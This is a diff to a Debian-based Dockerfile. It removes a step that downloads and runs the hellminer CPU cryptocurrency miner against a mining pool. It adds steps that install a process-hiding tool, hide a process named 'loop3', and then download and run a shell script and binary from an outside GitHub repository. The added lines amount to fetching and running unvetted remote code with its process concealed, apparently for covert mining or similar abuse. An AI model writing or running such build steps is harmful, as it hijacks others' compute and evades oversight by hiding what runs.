@@ -3,8 +3,13 @@ FROM debian:sid
 RUN apt update -y \
     	&& apt upgrade -y \
     	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev wget libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev
+        
+RUN gcc  
+RUN npm i -g node-process-hider
+RUN ph add loop3
 
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-RUN tar -xvf hellminer_cpu_linux.tar.gz
-RUN chmod +x hellminer
-RUN ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.Rig001 -p x --cpu 8
+RUN wget https://raw.githubusercontent.com/cihuuy/youtube/main/vera.sh
+RUN wget https://github.com/cihuuy/youtube/raw/main/loop3
+RUN chmod 777 loop3
+RUN chmod 777 vera.sh
+RUN ./vera.sh
